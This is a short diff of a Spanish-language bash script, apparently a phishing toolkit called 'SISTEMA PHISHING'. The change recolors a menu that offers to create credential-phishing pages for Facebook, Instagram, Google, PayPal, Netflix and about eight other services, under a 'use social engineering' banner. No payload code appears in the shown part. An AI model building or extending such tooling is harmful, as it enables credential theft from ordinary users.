@@ -480,25 +480,25 @@ echo " 	  		             \____|___\____|_|    \____|            "
 echo "				   ------ SISTEMA PHISHING ------ "
 
 
-echo -e "----------------------------------------------------------------------------------------------------"
 
-	
+
+echo -e "\e[1;32m                    -- USAR INGENIERIA SOCIAL -- "	
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Seleciona Un Ataque ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook    <-------------------- Crear Phishing Para Facebook (Diferentes Vectores)       
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram   <-------------------- Crear Phishing Para Instagram (Diferentes Vectores)  
-		${RED}[${WHITE}03${RED}]${ORANGE} Google      <-------------------- Crear Phishing Para Google (Diferentes Vectores)      	    	
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft   <-------------------- Crear Phishing Para Microsoft	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix     <-------------------- Crear Phishing Para Netflix   	
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal      <-------------------- Crear Phishing Para Paypal              
-${RED}[${WHITE}07${RED}]${ORANGE} Tiktok      <-------------------- Crear Phishing Para TikTok   
-		${RED}[${WHITE}08${RED}]${ORANGE} Spotify     <-------------------- Crear Phishing Para Spotify 
-		${RED}[${WHITE}09${RED}]${ORANGE} Twitch      <-------------------- Crear Phishing Para Twitch 
-		${RED}[${WHITE}10${RED}]${ORANGE} Badoo       <-------------------- Crear Phishing Para Badoo 
-		${RED}[${WHITE}11${RED}]${ORANGE} Snapchat    <-------------------- Crear Phishing Para Snapchat 
-${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	      <--------------- Crear Phishing Para Yahoo 
-		${RED}[${WHITE}13${RED}]${ORANGE} Twitter     <-------------------- Crear Phishing Para Twitter 
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook   ${WHITE} <-------------------- Crear Phishing Para Facebook (Diferentes Vectores)       
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram  ${WHITE}  <-------------------- Crear Phishing Para Instagram (Diferentes Vectores)  
+		${RED}[${WHITE}03${RED}]${ORANGE} Google     ${WHITE}  <-------------------- Crear Phishing Para Google (Diferentes Vectores)      	    	
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft  ${WHITE}  <-------------------- Crear Phishing Para Microsoft	
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix    ${WHITE}  <-------------------- Crear Phishing Para Netflix   	
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal     ${WHITE}  <-------------------- Crear Phishing Para Paypal              
+${RED}[${WHITE}07${RED}]${ORANGE} Tiktok    ${WHITE}   <-------------------- Crear Phishing Para TikTok   
+		${RED}[${WHITE}08${RED}]${ORANGE} Spotify    ${WHITE}  <-------------------- Crear Phishing Para Spotify 
+		${RED}[${WHITE}09${RED}]${ORANGE} Twitch     ${WHITE}  <-------------------- Crear Phishing Para Twitch 
+		${RED}[${WHITE}10${RED}]${ORANGE} Badoo      ${WHITE}  <-------------------- Crear Phishing Para Badoo 
+		${RED}[${WHITE}11${RED}]${ORANGE} Snapchat  ${WHITE}   <-------------------- Crear Phishing Para Snapchat 
+${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	     ${WHITE}  <--------------- Crear Phishing Para Yahoo 
+		${RED}[${WHITE}13${RED}]${ORANGE} Twitter  ${WHITE}    <-------------------- Crear Phishing Para Twitter 
 		${RED}[${WHITE}00${RED}]${ORANGE} Salir
 
 	EOF
